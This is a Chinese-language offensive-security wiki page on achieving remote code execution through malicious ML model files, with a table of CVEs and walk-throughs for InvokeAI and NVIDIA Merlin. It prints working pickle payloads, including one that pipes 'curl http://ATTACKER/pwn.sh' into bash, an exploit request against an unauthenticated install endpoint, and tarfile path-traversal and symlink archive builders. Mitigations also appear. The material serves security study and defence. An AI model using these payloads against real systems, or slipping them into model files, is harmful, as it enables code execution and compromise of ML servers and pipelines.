# 模型 RCE

{{#include ../banners/hacktricks-training.md}}

## 将模型加载以触发 RCE

Machine Learning 模型通常以不同格式共享，例如 ONNX、TensorFlow、PyTorch 等。这些模型可以被加载到开发者机器或生产系统中以供使用。通常模型不应包含恶意代码，但在某些情况下，模型可被用来在系统上执行任意代码，既可能是作为设计特性，也可能是因为模型加载库的漏洞。

在撰写本文时，以下是此类漏洞的一些示例：

| **框架 / 工具**            | **漏洞（如有 CVE）**                                                                     | **RCE 向量**                                                                                                                              | **参考**                                     |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *在* `torch.load` *中的不安全反序列化* **(CVE-2025-32434)**                                                              | 模型检查点中的恶意 pickle 导致代码执行（绕过 `weights_only` 保护）                                                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 恶意模型下载导致代码执行；管理 API 中的 Java 反序列化 RCE                                                                            | |
| **NVIDIA Merlin Transformers4Rec** | 通过 `torch.load` 的不安全检查点反序列化 **(CVE-2025-23298)**                                           | 不可信的检查点在 `load_model_trainer_states_from_checkpoint` 期间触发 pickle reducer → 在 ML worker 中执行代码                          | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | 从 YAML 加载模型使用 `yaml.unsafe_load`（代码执行） <br> 加载包含 **Lambda** 层的模型会运行任意 Python 代码                                | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 特制的 `.tflite` 模型触发整数溢出 → 堆破坏（可能导致 RCE）                                                                                | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | 通过 `joblib.load` 加载模型会执行包含攻击者 `__reduce__` 有效载荷的 pickle                                                                  | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` 默认允许序列化的对象数组 —— 恶意 `.npy/.npz` 可触发代码执行                                                                  | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 模型的 external-weights 路径可以逃出目录（读取任意文件） <br> 恶意 ONNX 模型 tar 可覆盖任意文件（可能导致 RCE）                        | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | 带自定义算子的模型需要加载攻击者的本地代码；复杂的模型图可以滥用逻辑以执行非预期计算                                                        | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | 在启用 `--model-control` 的情况下使用 model-load API 允许相对路径遍历写入文件（例如覆盖 `.bashrc` 导致 RCE）                                | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 格式不正确的 GGUF 模型文件导致解析器出现堆缓冲区溢出，从而在受害系统上实现任意代码执行                                                      | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | 恶意 HDF5 (`.h5`) 模型中包含的 Lambda 层代码在加载时仍然会执行（Keras safe_mode 不覆盖旧格式——“降级攻击”）                                   | |
| **Others** (general)        | *设计缺陷* – Pickle 序列化                                                                                         | 许多 ML 工具（例如基于 pickle 的模型格式、Python `pickle.load`）会执行嵌入在模型文件中的任意代码，除非采取缓解措施                              | |

此外，有一些基于 Python pickle 的模型（例如 PyTorch 使用的那些）如果没有使用 `weights_only=True` 加载，就可能被用来在系统上执行任意代码。因此，任何基于 pickle 的模型都可能特别容易受到此类攻击，即使它们未列在上表中。

### 🆕 InvokeAI 通过 `torch.load` 的 RCE (CVE-2024-12029)

`InvokeAI` 是一个流行的开源 Stable-Diffusion web 界面。版本 **5.3.1 – 5.4.2** 暴露了 REST 端点 `/api/v2/models/install`，允许用户从任意 URL 下载并加载模型。

内部该端点最终调用：
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
当提供的文件是 **PyTorch checkpoint (`*.ckpt`)** 时，`torch.load` 会执行 **pickle 反序列化**。因为内容直接来自用户可控的 URL，攻击者可以在 checkpoint 中嵌入带有自定义 `__reduce__` 方法的恶意对象；该方法在 **反序列化期间** 被执行，从而在 InvokeAI server 上导致 **remote code execution (RCE)**。

该漏洞被分配为 **CVE-2024-12029**（CVSS 9.8，EPSS 61.17%）。

#### Exploitation walk-through

1. 创建一个恶意的 checkpoint:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 在你控制的 HTTP 服务器上托管 `payload.ckpt`（例如 `http://ATTACKER/payload.ckpt`）。
3. 触发 vulnerable endpoint（无需 authentication）：
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. 当 InvokeAI 下载该文件时它会调用 `torch.load()` → `os.system` gadget 运行，攻击者在 InvokeAI 进程的上下文中获得代码执行权限。

Ready-made exploit: **Metasploit** 模块 `exploit/linux/http/invokeai_rce_cve_2024_12029` 自动化整个流程。

#### 条件

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)  
•  `/api/v2/models/install` 可被攻击者访问  
•  进程具有执行 shell 命令的权限

#### 缓解措施

* 升级到 **InvokeAI ≥ 5.4.3** – 补丁将 `scan=True` 设为默认，并在反序列化前执行恶意软件扫描。  
* 在以编程方式加载 checkpoints 时使用 `torch.load(file, weights_only=True)` 或新的 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper。  
* 对 model 来源实施 allow-lists / signatures，并以最小权限运行该服务。

> ⚠️ 记住 **任何** 基于 Python pickle 的格式（包括许多 `.pt`, `.pkl`, `.ckpt`, `.pth` 文件）从不受信任的来源反序列化本质上都是不安全的。

---

如果你必须在反向代理后保持旧版 InvokeAI 运行，下面是一个临时的缓解示例：
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE 通过不安全的 `torch.load` (CVE-2025-23298)

NVIDIA 的 Transformers4Rec（属于 Merlin）暴露了一个不安全的 checkpoint 加载器，它直接对用户提供的路径调用 `torch.load()`。由于 `torch.load` 依赖于 Python 的 `pickle`，攻击者控制的 checkpoint 可以在反序列化期间通过 reducer 执行任意代码。

易受攻击的路径（修复前）： `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`。

为什么这会导致 RCE：在 Python 的 `pickle` 中，对象可以定义一个 reducer（`__reduce__`/`__setstate__`），返回一个可调用对象和参数。该可调用对象会在反序列化期间执行。如果这样的对象存在于 checkpoint 中，它会在任何权重被使用前运行。

最小的恶意 checkpoint 示例：
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
传递载体和影响范围:
- 通过 repo、bucket 或 artifact registry 共享的被木马化的 checkpoints/models
- 自动化的 resume/deploy 流水线会自动加载 checkpoints
- 执行发生在 training/inference workers 中，常常具有提升的权限（例如容器内的 root）

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) 将直接的 `torch.load()` 替换为在 `transformers4rec/utils/serialization.py` 中实现的受限、允许列表的反序列化器。新的加载器会验证类型/字段并阻止在加载过程中调用任意可调用对象。

针对 PyTorch checkpoints 的防御性建议:
- 不要对不受信任的数据进行 unpickle。尽可能优先使用非可执行格式，如 [Safetensors](https://huggingface.co/docs/safetensors/index) 或 ONNX。
- 如果必须使用 PyTorch serialization，确保 `weights_only=True`（在较新的 PyTorch 中受支持），或者使用类似于 Transformers4Rec 补丁的自定义允许列表 unpickler。
- 强制模型来源/签名，并在沙箱中进行反序列化（seccomp/AppArmor；非 root 用户；受限文件系统且无网络出站）。
- 在 checkpoint 加载时监控 ML 服务产生的意外子进程；追踪 `torch.load()`/`pickle` 的使用。

POC 以及易受攻击/补丁 参考:
- 补丁前的易受攻击加载器: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- 恶意 checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- 补丁后的加载器: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## 示例 – 制作一个恶意的 PyTorch 模型

- 创建模型：
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 加载模型:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Models to Path Traversal

正如在 [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) 中所述，不同 AI 框架使用的大多数模型格式基于归档（通常是 `.zip`）。因此，可能可以滥用这些格式来执行 path traversal attacks，从而读取模型加载所在系统上的任意文件。

例如，使用下面的代码你可以创建一个在加载时会在 `/tmp` 目录中创建文件的模型：
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
或者，使用下面的代码，你可以创建一个模型，在加载时会创建一个指向 `/tmp` 目录的 symlink：
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 深入解析: Keras .keras deserialization 和 gadget hunting

有关 .keras internals、Lambda-layer RCE、≤ 3.8 中的 arbitrary import issue，以及 allowlist 内的 post-fix gadget discovery 的专题指南，请参阅：


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 参考资料

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
